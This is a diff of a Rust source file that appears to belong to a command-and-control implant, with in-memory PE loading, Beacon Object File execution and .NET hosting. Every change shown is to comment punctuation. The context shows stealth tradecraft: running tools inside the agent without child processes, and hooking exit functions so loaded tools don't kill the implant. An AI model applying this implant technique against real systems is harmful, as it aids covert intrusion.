@@ -1,9 +1,9 @@
 // src/agent/inmem.rs
 //
 // In-memory code execution primitives:
-//   1. PE Loader   – manually map a PE/DLL into the current process and call its entry point
-//   2. BOF Runner  – parse a COFF object, resolve relocations, execute a target function
-//   3. .NET Host   – load the CLR and execute a .NET assembly via COM interop
+//   1. PE Loader - manually map a PE/DLL into the current process and call its entry point
+//   2. BOF Runner - parse a COFF object, resolve relocations, execute a target function
+//   3. .NET Host - load the CLR and execute a .NET assembly via COM interop
 //
 // All three run inside the agent process; no child process is spawned.
 
@@ -164,7 +164,7 @@ pub mod pe_loader {
         let preferred_base = nt.optional_header.image_base;
 
         // The headers are part of the image, so a PE whose SizeOfHeaders exceeds
-        // SizeOfImage is malformed — the header copy would otherwise write past
+        // SizeOfImage is malformed - the header copy would otherwise write past
         // the VirtualAlloc'd region.
         if image_size == 0 || header_size > image_size {
             return Err("Invalid SizeOfImage/SizeOfHeaders".into());
@@ -197,7 +197,7 @@ pub mod pe_loader {
 
         if base.is_null() { return Err("VirtualAlloc failed".into()); }
 
-        // 2. Copy headers — capped by BOTH the file size and the allocated
+        // 2. Copy headers - capped by BOTH the file size and the allocated
         // image size (SizeOfHeaders > SizeOfImage is rejected above; the clamp
         // stays as defense-in-depth).
         ptr::copy_nonoverlapping(
@@ -206,7 +206,7 @@ pub mod pe_loader {
             header_size.min(pe_bytes.len()).min(image_size),
         );
 
-        // 3. Copy sections (section-table reads are in bounds — validated above)
+        // 3. Copy sections (section-table reads are in bounds - validated above)
         for i in 0..section_count {
             let sec = &*(pe_bytes.as_ptr().add(sections_offset + i * mem::size_of::<ImageSectionHeader>()) as *const ImageSectionHeader);
             if sec.size_of_raw_data == 0 { continue; }
@@ -272,7 +272,7 @@ pub mod pe_loader {
 
                         let entry_count = (block_size - 8) / 2;
                         // Entries occupy [block_rva + 8, block_rva + 8 + entry_count*2),
-                        // which is inside [block_rva, block_rva + block_size) —
+                        // which is inside [block_rva, block_rva + block_size) -
                         // already validated against image_size above.
                         let entries = std::slice::from_raw_parts(
                             (base as *const u8).add(block_rva + 8) as *const u16,
@@ -312,7 +312,7 @@ pub mod pe_loader {
                     let import_rva = import_dir.virtual_address as usize;
                     let mut desc_offset = 0usize;
                     loop {
-                        // The descriptor walk previously had NO bounds check —
+                        // The descriptor walk previously had NO bounds check -
                         // every descriptor read is now validated against the
                         // mapped image before it happens.
                         let desc_rva = import_rva + desc_offset;
@@ -355,7 +355,7 @@ pub mod pe_loader {
                                 let ordinal = (olt_entry & 0xFFFF) as u16;
                                 GetProcAddress(h_module, ordinal as usize as *const i8)
                             } else {
-                                // Import by name (skip 2-byte hint) — bounded C-string
+                                // Import by name (skip 2-byte hint) - bounded C-string
                                 // read so a hostile RVA can't scan out of bounds.
                                 let name_rva = match (olt_entry as usize).checked_add(2) {
                                     Some(r) => r,
@@ -373,7 +373,7 @@ pub mod pe_loader {
                                 };
                                 let resolved = GetProcAddress(h_module, func_name.as_ptr());
 
-                                // OPSEC: Redirect process-terminating functions → ExitThread
+                                // OPSEC: Redirect process-terminating functions -> ExitThread
                                 // so EXEs running in the loader thread don't kill the agent.
                                 //
                                 // ExitProcess (kernel32) is the obvious one, but MSVC/UCRT
@@ -381,7 +381,7 @@ pub mod pe_loader {
                                 // exit(), _exit(), _cexit(), _c_exit(), or abort() from
                                 // msvcrt.dll / ucrtbase.dll. These call ExitProcess internally,
                                 // but the IAT hook on ExitProcess only catches calls through
-                                // the loaded PE's own import table — not calls from within
+                                // the loaded PE's own import table - not calls from within
                                 // the CRT DLL. We must hook the CRT functions themselves.
                                 let fname_bytes = func_name.to_bytes();
                                 let is_exit_func = fname_bytes == b"ExitProcess"
@@ -420,7 +420,7 @@ pub mod pe_loader {
                                 return Err(format!("Import resolution failed: {}!{}", dll_str, name_info));
                             }
 
-                            // Patch the IAT — the write target is validated
+                            // Patch the IAT - the write target is validated
                             // against image_size first (previously unchecked).
                             let iat_rva = desc.first_thunk as usize + thunk_offset;
                             if !range_ok(iat_rva, 8, image_size) {
@@ -439,7 +439,7 @@ pub mod pe_loader {
             }
         }
 
-        // 6. Set section protections (table reads are in bounds — validated
+        // 6. Set section protections (table reads are in bounds - validated
         // above; each protection range is clamped to the mapped image so a
         // malformed section header can't make VirtualProtect touch memory
         // past the allocation).
@@ -538,7 +538,7 @@ pub mod pe_loader {
 }
 
 // ────────────────────────────────────────────────────────────────────────
-// 2. BOF RUNNER (Beacon Object File – COFF loader)
+// 2. BOF RUNNER (Beacon Object File - COFF loader)
 // ────────────────────────────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
@@ -741,7 +741,7 @@ pub mod bof {
         // Per-section in-memory footprint. This MUST be identical in the
         // sizing pass and the copy/relocation passes: the old code summed
         // `(raw > 0) ? raw : virtual` here but advanced the copy pass by
-        // `max(raw, virtual)` — sections with virtual_size > size_of_raw_data > 0
+        // `max(raw, virtual)` - sections with virtual_size > size_of_raw_data > 0
         // made the copy and relocation writes run past the allocation.
         let section_footprint = |sec: &CoffSection| -> usize {
             let span = (sec.size_of_raw_data as usize).max(sec.virtual_size as usize);
@@ -823,7 +823,7 @@ pub mod bof {
         let get_symbol_name = |sym: &CoffSymbol| -> Option<String> {
             if sym.name[0..4] == [0, 0, 0, 0] {
                 // Name is in the string table. The offset is untrusted: the old
-                // code sliced `coff_bytes[start..]` unchecked (panic → abort with
+                // code sliced `coff_bytes[start..]` unchecked (panic -> abort with
                 // panic="abort", killing the implant). Bounds-check the start and
                 // scan for the NUL terminator WITHIN the buffer.
                 let str_offset = u32::from_le_bytes([sym.name[4], sym.name[5], sym.name[6], sym.name[7]]) as usize;
@@ -838,7 +838,7 @@ pub mod bof {
             }
         };
 
-        // Build symbol address map (symbol-table reads are in bounds — validated above)
+        // Build symbol address map (symbol-table reads are in bounds - validated above)
         let mut symbol_addrs: Vec<u64> = Vec::with_capacity(num_symbols);
         let mut go_addr: Option<*const u8> = None;
         let mut i = 0;
@@ -877,7 +877,7 @@ pub mod bof {
         }
 
         // Process relocations (section and relocation table reads are in
-        // bounds — validated up front)
+        // bounds - validated up front)
         for i in 0..num_sections {
             let sec = *(coff_bytes.as_ptr().add(sections_offset + i * mem::size_of::<CoffSection>()) as *const CoffSection);
             let num_relocs = sec.number_of_relocations as usize;
@@ -893,7 +893,7 @@ pub mod bof {
                 if sym_idx >= symbol_addrs.len() { continue; }
                 let sym_addr = symbol_addrs[sym_idx];
 
-                // The patch site comes from a raw u32 in untrusted input — the
+                // The patch site comes from a raw u32 in untrusted input - the
                 // old code wrote through it with no bounds check (OOB write).
                 // Validate it against THIS section's allocated footprint first.
                 let patch_rva = reloc.virtual_address as usize;
@@ -904,7 +904,7 @@ pub mod bof {
                 };
                 if patch_rva.checked_add(patch_size).map_or(true, |end| end > sec_footprint) {
                     VirtualFree(base, 0, MEM_RELEASE);
-                    // NB: use the local `patch_rva` copy — referencing the packed
+                    // NB: use the local `patch_rva` copy - referencing the packed
                     // field `reloc.virtual_address` directly (as format! does)
                     // is E0793 undefined behavior.
                     return Err(format!(
@@ -925,12 +925,12 @@ pub mod bof {
                     IMAGE_REL_AMD64_REL32 => {
                         let distance = sym_addr as i64 - (patch_site as i64 + 4);
                         if distance >= i32::MIN as i64 && distance <= i32::MAX as i64 {
-                            // Distance fits in i32 — direct relative patch
+                            // Distance fits in i32 - direct relative patch
                             *(patch_site as *mut i32) = distance as i32;
                         } else {
-                            // Distance exceeds ±2GB — emit a trampoline stub:
+                            // Distance exceeds ±2GB - emit a trampoline stub:
                             //   mov rax, <abs_addr>   ; 48 B8 <8 bytes>
-                            //   jmp rax               ; FF E0
+                            //   jmp rax ; FF E0
                             // Then patch the REL32 to point to the trampoline.
                             if trampoline_offset + TRAMPOLINE_SIZE <= alloc_size {
                                 let tramp = (base as *mut u8).add(trampoline_offset);
@@ -953,7 +953,7 @@ pub mod bof {
                             }
                         }
                     }
-                    _ => {} // unreachable — unsupported types skipped above
+                    _ => {} // unreachable - unsupported types skipped above
                 }
             }
         }
@@ -987,17 +987,17 @@ pub mod bof {
         let handle = std::thread::spawn(move || -> Result<(), String> {
             unsafe {
                 let tid = GetCurrentThreadId();
-                // Register this thread — lock is released immediately after insert
+                // Register this thread - lock is released immediately after insert
                 {
                     bof_thread_ids().lock().unwrap_or_else(|e| e.into_inner()).insert(tid);
                 }
-                // VEH is registered AFTER the lock is released — no locks held from here
+                // VEH is registered AFTER the lock is released - no locks held from here
                 let veh = AddVectoredExceptionHandler(1, bof_veh_handler);
 
                 // Two layers of crash containment:
                 //   1. VEH (above): catches HARDWARE exceptions (segfaults, illegal
                 //      instructions, etc.) by calling ExitThread on this thread.
-                //      catch_unwind does NOT catch these — only VEH does.
+                //      catch_unwind does NOT catch these - only VEH does.
                 //   2. catch_unwind: catches RUST panics (if the BOF triggers one
                 //      through FFI boundary, or if Rust code panics before/after go()).
                 let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
@@ -1006,7 +1006,7 @@ pub mod bof {
                     go_fn(args_ptr as *const u8, args_len);
                 }));
 
-                // Normal return — unregister this thread and remove handler
+                // Normal return - unregister this thread and remove handler
                 bof_thread_ids().lock().unwrap_or_else(|e| e.into_inner()).remove(&tid);
                 RemoveVectoredExceptionHandler(veh);
 
@@ -1027,7 +1027,7 @@ pub mod bof {
         // CRITICAL: Do NOT VirtualFree immediately. BOFs commonly spawn async
         // background threads (CreateThread) that continue executing code from
         // the mapped COFF after go() returns. Freeing the memory here would
-        // unmap their code mid-execution → access violation.
+        // unmap their code mid-execution -> access violation.
         //
         // Deferred cleanup: wait on a background thread for a grace period,
         // then free. Long-running BOF extensions that outlive the grace period
@@ -1073,7 +1073,7 @@ pub mod dotnet {
     use std::ptr;
 
     // CLR COM interface GUIDs and vtable offsets.
-    // We use ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost to execute
+    // We use ICLRMetaHost -> ICLRRuntimeInfo -> ICLRRuntimeHost to execute
     // a managed assembly via ExecuteInDefaultAppDomain.
 
     #[repr(C)]
